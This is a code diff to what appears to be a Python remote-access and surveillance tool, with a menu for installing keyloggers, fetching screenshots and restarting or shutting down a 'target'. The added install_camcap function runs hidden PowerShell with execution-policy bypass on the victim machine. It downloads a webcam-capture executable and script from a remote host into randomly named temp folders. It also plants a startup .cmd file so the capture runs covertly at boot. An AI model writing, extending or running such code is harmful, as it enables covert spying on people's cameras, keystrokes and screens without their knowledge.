@@ -39,15 +39,17 @@ help_menu = """
 
 options_menu = """
             [+] command and control:
-                [0] Remote Console
-                [1] Install Keylogger       
-                [2] Fetch keylogs
-                [3] Install Screenshot
-                [4] Fetch Screenshot
-                [5] remote download (not done yet) 
-                [6] remote upload   (not done yet) 
-                [7] restart target
-                [8] shutdown target
+                [0]  Remote Console
+                [1]  Install Keylogger       
+                [2]  Fetch keylogs
+                [3]  Install Screenshot
+                [4]  Fetch Screenshot
+                [5]  remote download 
+                [6]  remote upload 
+                [7]  restart target
+                [8]  shutdown target
+                [9]  Install Webcam Capture
+                [10] Fetch Webcam Capture
 
             [+] Options:
                 [-h] or [--help]     ---   help
@@ -85,6 +87,10 @@ def read_config(config_file):
     configuration[TEMPDIR_KEY] = read_lines[3].replace("\\","/").strip()
     configuration[STARTUPDIR_KEY] = read_lines[4].replace("\\","/").strip()
     return configuration
+
+def show_config(configuration):
+    for key,value in configuration.items():
+        print(f"{key} : {value}")
 
 # remotely connect to target
 def connect(ipv4,pword):
@@ -179,6 +185,17 @@ def fetch_screenshot(ipv4,pword,temp_path,uname):
     remote_command(ipv4,pword,f"powershell remove-item -path {temp_path}/AbLtcVKTqN -Force -recurse")
     print("[*] Done. Folder wiped...")
 
+def install_camcap(ipv4,pword,temp_dir,startup_dir):
+    print("[+] Downloading cam capture...")
+    camcap_download = """powershell powershell.exe -noP -ep bypass -w hidden -command \"{mkdir """+temp_dir+"""/QKlYTmHhCDy; iwr -uri """+remote_path+"""/webcam_cap/camcap.exe -outfile """+temp_dir+"""/QKlYTmHhCDy/KJUwHZlCNV.exe}\" """
+    webcam_download = f"""powershell powershell.exe -noP -ep bypass -w hidden -c \"iwr -uri {remote_path}/webcam_cap/webcam.ps1 -outfile {temp_dir}/QKlYTmHhCDy/sjzQVatArhvlHXifK.ps1\" """
+    controller_command = f"""powershell add-content -path \\"{startup_dir}/meuqSoQyrCUvhGjpV.cmd\\" -value \\"powershell -noP -ep bypass -w hidden start-process powershell.exe -windowstyle hidden "{temp_dir}/sjzQVatArhvlHXifK.ps1" \\" """
+    remote_command(ipv4,pword,camcap_download)
+    remote_command(ipv4,pword,webcam_download)
+    remote_command(ipv4,pword,controller_command)
+    print("[*] Downloaded cam capture...")
+    print("[*] Restart target host to execute...")
+
 def update():
     return
 
@@ -224,6 +241,10 @@ def cli(arguments):
                     remote_command(tgt_ipv4,tgt_pword,"shutdown /r /t 0")
                 elif option == "8":
                     remote_command(tgt_ipv4,tgt_pword,"shutdown /s /t 0")
+                elif option == "9":
+                    install_camcap(tgt_ipv4,tgt_pword,tgt_td,tgt_sd)
+                elif option in ["config","c"]:
+                    show_config(configuration)
                 elif option == "help":
                     clear()
                     print(banner)
